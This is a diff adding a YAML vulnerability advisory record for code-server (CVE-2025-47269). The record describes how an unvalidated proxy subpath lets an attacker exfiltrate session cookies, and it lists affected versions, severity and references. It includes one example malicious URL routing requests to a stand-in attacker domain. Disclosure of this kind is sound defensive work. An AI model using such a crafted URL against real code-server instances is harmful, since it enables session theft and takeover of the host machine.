@@ -1,0 +1,59 @@
+advisory_id: GHSA-p483-wpfp-42cj
+datasource_id: github_osv_importer_v2/GHSA-p483-wpfp-42cj
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/05/GHSA-p483-wpfp-42cj/GHSA-p483-wpfp-42cj.json
+aliases:
+  - CVE-2025-47269
+summary: |
+  code-server's session cookie can be extracted by having user visit specially crafted proxy URL
+  ### Summary
+
+  A maliciously crafted URL using the `proxy` subpath can result in the attacker gaining access to the session token.
+
+  ### Details
+
+  Failure to properly validate the port for a `proxy` request can result in proxying to an arbitrary domain. The malicious URL `https://<code-server>/proxy/test@evil.com/path` would be proxied to `test@evil.com/path` where the attacker could exfiltrate a user's session token.
+
+  ### Impact
+
+  Any user who runs code-server with the built-in proxy enabled and clicks on maliciously crafted links that go to their code-server instances with reference to `/proxy`.
+
+  Normally this is used to proxy local ports, however the URL can reference the attacker's domain instead, and the connection is then proxied to that domain, which will include sending cookies.
+
+  With access to the session cookie, the attacker can then log into code-server and have full access to the machine hosting code-server as the user running code-server.
+
+  ### Patches
+
+  Patched versions are from [v4.99.4](https://github.com/coder/code-server/releases/tag/v4.99.4) onward.
+impacted_packages:
+  - purl: pkg:npm/code-server
+    affected_versions: vers:npm/<4.99.4
+    fixed_versions: vers:npm/4.99.4
+severities:
+  - score: '8.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/05/GHSA-p483-wpfp-42cj/GHSA-p483-wpfp-42cj.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-441
+references:
+  - url: https://github.com/coder/code-server
+    reference_type:
+    reference_id:
+  - url: https://github.com/coder/code-server/commit/47d6d3ada5aadef6d221f3d612401eb3dad9299e
+    reference_type:
+    reference_id:
+  - url: https://github.com/coder/code-server/releases/tag/v4.99.4
+    reference_type:
+    reference_id:
+  - url: https://github.com/coder/code-server/security/advisories/GHSA-p483-wpfp-42cj
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-47269
+    reference_type:
+    reference_id:
